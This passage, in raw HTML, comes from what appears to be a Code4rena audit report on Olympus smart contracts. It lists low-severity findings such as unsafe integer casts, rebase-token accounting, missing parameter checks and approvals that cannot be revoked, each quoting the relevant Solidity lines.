assets to the treasury. It may not be profitable for the attacker, but it may cause devaluing of the ohm. However, the loss will be limited to the capacity.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"51\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">// Operator::swap</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">// if(tokenIn_ == reserve) : buying ohm</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">329</span><span class=\"mtk1\">             </span><span class=\"mtk3\">/// Transfer reserves to treasury</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">330</span><span class=\"mtk1\">             </span><span class=\"mtk12\">reserve</span><span class=\"mtk1\">.</span><span class=\"mtk11\">safeTransferFrom</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">, </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">TRSRY</span><span class=\"mtk1\">), </span><span class=\"mtk12\">amountIn_</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<h2 id=\"l-02-bondcallback-incorrect-accounting-if-quotetoken-is-rebase-token\" style=\"position:relative;\"><a href=\"#l-02-bondcallback-incorrect-accounting-if-quotetoken-is-rebase-token\" aria-label=\"l 02 bondcallback incorrect accounting if quotetoken is rebase token permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[L-02] BondCallback: incorrect accounting if quoteToken is rebase token</h2>\n<ul>\n<li><a href=\"https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/BondCallback.sol#L114\">https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/BondCallback.sol#L114</a></li>\n</ul>\n<p>If the quoteToken is rebase token, the priorBalances may change due to rebasing or airdrop. It may result to an incorrect accounting. However, whether it is exploitable depends on the Bond market’s logic.<br>\nWith the current logic, it just checks whether the balance is increased more than the <code>inputAmount_</code>, so it is harder to exploit, compare to the alternative logic of using the difference in balances as the input amount. However, it also introduces the possibility of paying the users less than they deserve.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"52\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">// Callback::callback</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">113</span><span class=\"mtk1\">         </span><span class=\"mtk3\">// Check that quoteTokens were transferred prior to the call</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">114</span><span class=\"mtk1\">         </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">quoteToken</span><span class=\"mtk1\">.</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">)) &lt; </span><span class=\"mtk12\">priorBalances</span><span class=\"mtk1\">[</span><span class=\"mtk12\">quoteToken</span><span class=\"mtk1\">] + </span><span class=\"mtk12\">inputAmount_</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">115</span><span class=\"mtk1\">             </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">Callback_TokensNotReceived</span><span class=\"mtk1\">();</span></span></span></code></pre>\n<h2 id=\"l-03-price-unsafe-cast-for-numobservations\" style=\"position:relative;\"><a href=\"#l-03-price-unsafe-cast-for-numobservations\" aria-label=\"l 03 price unsafe cast for numobservations permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[L-03] PRICE: unsafe cast for <code>numObservations</code></h2>\n<ul>\n<li><a href=\"https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/PRICE.sol#L97\">https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/PRICE.sol#L97</a></li>\n<li><a href=\"https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/PRICE.sol#L249-L257\">https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/PRICE.sol#L249-L257</a></li>\n<li><a href=\"https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/PRICE.sol#L281-L289\">https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/PRICE.sol#L281-L289</a></li>\n</ul>\n<p>The <code>movingAverageDuration</code> and <code>observationFrequency</code> are uint48. So <code>movingAverageDuration / observationFrequency</code> may overflow when casted to uint32. In the below snippet, line 281, the array will be set based on the uint256 value, but the <code>numObservations</code> is casted down to uint32. It may result in different <code>numObservations</code> and the length of <code>observations</code> array.\nHowever, given the large numbers, the attempt to set such a large number as the parameters will likely to fail with “out of gas” error, since the length of the array <code>observations</code> is ridiculously large in this case. Yet, it is probably safe to set some upper limit for the <code>numObservations</code> or use safeCast.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"53\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">// modules/PRICE::constructor</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">97</span><span class=\"mtk1\">         </span><span class=\"mtk12\">numObservations</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">uint32</span><span class=\"mtk1\">(</span><span class=\"mtk12\">movingAverageDuration_</span><span class=\"mtk1\"> / </span><span class=\"mtk12\">observationFrequency_</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">// modules/PRICE::changeObservationFrequency</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">280</span><span class=\"mtk1\">         </span><span class=\"mtk3\">// Store blank observations array of new size</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">281</span><span class=\"mtk1\">         </span><span class=\"mtk12\">observations</span><span class=\"mtk1\"> = </span><span class=\"mtk4\">new</span><span class=\"mtk1\"> </span><span class=\"mtk10\">uint256</span><span class=\"mtk1\">[](</span><span class=\"mtk12\">newObservations</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">282</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">283</span><span class=\"mtk1\">         </span><span class=\"mtk3\">// Set initialized to false and update state variables</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">284</span><span class=\"mtk1\">         </span><span class=\"mtk12\">initialized</span><span class=\"mtk1\"> = </span><span class=\"mtk4\">false</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">285</span><span class=\"mtk1\">         </span><span class=\"mtk12\">lastObservationTime</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">286</span><span class=\"mtk1\">         </span><span class=\"mtk12\">_movingAverage</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">287</span><span class=\"mtk1\">         </span><span class=\"mtk12\">nextObsIndex</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">288</span><span class=\"mtk1\">         </span><span class=\"mtk12\">observationFrequency</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">observationFrequency_</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">289</span><span class=\"mtk1\">         </span><span class=\"mtk12\">numObservations</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">uint32</span><span class=\"mtk1\">(</span><span class=\"mtk12\">newObservations</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<h2 id=\"l-04-operator-unsafe-cast-for-decimals\" style=\"position:relative;\"><a href=\"#l-04-operator-unsafe-cast-for-decimals\" aria-label=\"l 04 operator unsafe cast for decimals permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[L-04] Operator: unsafe cast for decimals</h2>\n<ul>\n<li><a href=\"https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Operator.sol#L372\">https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Operator.sol#L372</a></li>\n<li><a href=\"https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Operator.sol#L427\">https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Operator.sol#L427</a></li>\n<li><a href=\"https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Operator.sol#L431-L434\">https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Operator.sol#L431-L434</a></li>\n<li><a href=\"https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Operator.sol#L375-L379\">https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Operator.sol#L375-L379</a></li>\n</ul>\n<p>In the <code>Operator::_activate</code> decimal values were casted to <code>int8</code> and <code>uint8</code> back and forth. Since there is no check, those values can potentially overflow/underflow. However, if it happens the exponent in the line 376 will like to revert due to too large numbers. Besides, if the price decimals are that big, this may not be the biggest problem to face.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"54\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">// policies/Operator.sol::_activate</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">372</span><span class=\"mtk1\">             </span><span class=\"mtk12\">int8</span><span class=\"mtk1\"> </span><span class=\"mtk12\">scaleAdjustment</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">int8</span><span class=\"mtk1\">(</span><span class=\"mtk12\">ohmDecimals</span><span class=\"mtk1\">) - </span><span class=\"mtk11\">int8</span><span class=\"mtk1\">(</span><span class=\"mtk12\">reserveDecimals</span><span class=\"mtk1\">) + (</span><span class=\"mtk12\">priceDecimals</span><span class=\"mtk1\"> / </span><span class=\"mtk7\">2</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">375</span><span class=\"mtk1\">             </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">oracleScale</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">10</span><span class=\"mtk1\">**</span><span class=\"mtk11\">uint8</span><span class=\"mtk1\">(</span><span class=\"mtk11\">int8</span><span class=\"mtk1\">(</span><span class=\"mtk12\">PRICE</span><span class=\"mtk1\">.</span><span class=\"mtk11\">decimals</span><span class=\"mtk1\">()) - </span><span class=\"mtk12\">priceDecimals</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">376</span><span class=\"mtk1\">             </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">bondScale</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">10</span><span class=\"mtk1\"> **</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">377</span><span class=\"mtk1\">                 </span><span class=\"mtk11\">uint8</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">378</span><span class=\"mtk1\">                     </span><span class=\"mtk7\">36</span><span class=\"mtk1\"> + </span><span class=\"mtk12\">scaleAdjustment</span><span class=\"mtk1\"> + </span><span class=\"mtk11\">int8</span><span class=\"mtk1\">(</span><span class=\"mtk12\">reserveDecimals</span><span class=\"mtk1\">) - </span><span class=\"mtk11\">int8</span><span class=\"mtk1\">(</span><span class=\"mtk12\">ohmDecimals</span><span class=\"mtk1\">) - </span><span class=\"mtk12\">priceDecimals</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">379</span><span class=\"mtk1\">                 );</span></span></span></code></pre>\n<h2 id=\"l-05-bondcallback-operator-is-not-set-constructor\" style=\"position:relative;\"><a href=\"#l-05-bondcallback-operator-is-not-set-constructor\" aria-label=\"l 05 bondcallback operator is not set constructor permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[L-05] BondCallback: operator is not set <code>constructor</code></h2>\n<ul>\n<li><a href=\"https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/BondCallback.sol#L38-L45\">https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/BondCallback.sol#L38-L45</a></li>\n</ul>\n<p>If the <code>operator</code> is not set, the <code>callback</code> function will revert so, it is crucial to set the <code>operator</code> before any operation. However, it was not set in the <code>constructor</code>, but should be set separately by calling <code>setOperator</code>.</p>\n<h2 id=\"l-06-operator-missing-check-for-configparmas0-cushionfactor-in-the-constructor\" style=\"position:relative;\"><a href=\"#l-06-operator-missing-check-for-configparmas0-cushionfactor-in-the-constructor\" aria-label=\"l 06 operator missing check for configparmas0 cushionfactor in the constructor permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[L-06] Operator: missing check for configParmas[0] (cushionFactor) in the constructor</h2>\n<ul>\n<li><a href=\"https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Operator.sol#L92-L150\">https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Operator.sol#L92-L150</a></li>\n<li><a href=\"https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Operator.sol#L516-L524\">https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Operator.sol#L516-L524</a></li>\n</ul>\n<p>The <code>Operator::constructor</code> does not check the condition of the <code>cushionFactor</code>. Below is the condition for the <code>cushionFactor</code> checked in the <code>Operator::setCushionFactor</code>.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"55\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">// Operator::setCushionFactor</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">516</span><span class=\"mtk1\">     </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">setCushionFactor</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint32</span><span class=\"mtk1\"> </span><span class=\"mtk12\">cushionFactor_</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyRole</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;operator_policy&quot;</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">517</span><span class=\"mtk1\">         </span><span class=\"mtk3\">/// Confirm factor is within allowed values</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">518</span><span class=\"mtk1\">         </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">cushionFactor_</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk7\">10000</span><span class=\"mtk1\"> || </span><span class=\"mtk12\">cushionFactor_</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk7\">100</span><span class=\"mtk1\">) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">Operator_InvalidParams</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">519</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">520</span><span class=\"mtk1\">         </span><span class=\"mtk3\">/// Set factor</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">521</span><span class=\"mtk1\">         </span><span class=\"mtk12\">_config</span><span class=\"mtk1\">.</span><span class=\"mtk12\">cushionFactor</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">cushionFactor_</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">522</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">523</span><span class=\"mtk1\">         </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">CushionFactorChanged</span><span class=\"mtk1\">(</span><span class=\"mtk12\">cushionFactor_</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">524</span><span class=\"mtk1\">     }</span></span></span></code></pre>\n<h2 id=\"l-07-kernel-misplaced-zero-address-check-for-changekernel\" style=\"position:relative;\"><a href=\"#l-07-kernel-misplaced-zero-address-check-for-changekernel\" aria-label=\"l 07 kernel misplaced zero address check for changekernel permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[L-07] Kernel: misplaced zero address check for <code>changeKernel</code></h2>\n<ul>\n<li><a href=\"https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/Kernel.sol#L76-L78\">https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/Kernel.sol#L76-L78</a></li>\n<li><a href=\"https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/Kernel.sol#L254-L257\">https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/Kernel.sol#L254-L257</a></li>\n</ul>\n<p>Currently, the check for the <code>Kernel</code> to be a contract (also not to be the zero address), is in the current <code>Kernel</code> implementation. However, no modules and policies have the logic to ensure this as they inherit from <code>KernelAdapter</code>, which will just set the new kernel without a question. This will work well as long as the new Kernel has the similar logic to check the next Kernel’s integrity. However, if the logic is forgotten, there is no other safe guard to ensure that the next kernel is not a zero address and is a contract.\nSince <code>Kernel</code> is absolutely needed for this system’s functionality, there is no possible case that the Kernel should be the zero address. Therefore, it is probably safe to add the checking logic to the <code>KernelAdapter</code>, so every module and policy will check for the next Kernel. It costs more gas since the check is done multiple times, but still arguably it is worth the cost, since Kernel is core part of the system and it will not updated very often.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"56\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">// KernelAdapter::changeKernel</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> </span><span class=\"mtk7\">76</span><span class=\"mtk1\">     </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">changeKernel</span><span class=\"mtk1\">(</span><span class=\"mtk12\">Kernel</span><span class=\"mtk1\"> </span><span class=\"mtk12\">newKernel_</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyKernel</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> </span><span class=\"mtk7\">77</span><span class=\"mtk1\">         </span><span class=\"mtk12\">kernel</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">newKernel_</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> </span><span class=\"mtk7\">78</span><span class=\"mtk1\">     }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">// Kernel::executeAction</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">254</span><span class=\"mtk1\">         } </span><span class=\"mtk15\">else</span><span class=\"mtk1\"> </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">action_</span><span class=\"mtk1\"> == </span><span class=\"mtk12\">Actions</span><span class=\"mtk1\">.</span><span class=\"mtk12\">MigrateKernel</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">255</span><span class=\"mtk1\">             </span><span class=\"mtk11\">ensureContract</span><span class=\"mtk1\">(</span><span class=\"mtk12\">target_</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">256</span><span class=\"mtk1\">             </span><span class=\"mtk11\">_migrateKernel</span><span class=\"mtk1\">(</span><span class=\"mtk11\">Kernel</span><span class=\"mtk1\">(</span><span class=\"mtk12\">target_</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">257</span><span class=\"mtk1\">         }</span></span></span></code></pre>\n<h2 id=\"l-08-bondcallback-operator-upon-modules-upgrade-the-token-approval-should-be-revoked\" style=\"position:relative;\"><a href=\"#l-08-bondcallback-operator-upon-modules-upgrade-the-token-approval-should-be-revoked\" aria-label=\"l 08 bondcallback operator upon modules upgrade the token approval should be revoked permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[L-08] BondCallback, Operator: upon module’s upgrade, the token approval should be revoked</h2>\n<ul>\n<li><a href=\"https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/BondCallback.sol#L57\">https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/BondCallback.sol#L57</a></li>\n<li><a href=\"https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Operator.sol#L167\">https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Operator.sol#L167</a></li>\n</ul>\n<p>The <code>BondCallback</code> and <code>Operator</code> approves ohm to the <code>MINTR</code> module in the <code>configureDependencies</code>. However, there is no logic to revoke those approvals (e.i. approve to zero). In the case of the <code>MINTR</code> has some bugs, it may be desirable to be able to revoke the approvals.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"57\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">// Operator::configureDependencies</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">167</span><span class=\"mtk1\">         </span><span class=\"mtk12\">ohm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">safeApprove</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">MINTR</span><span 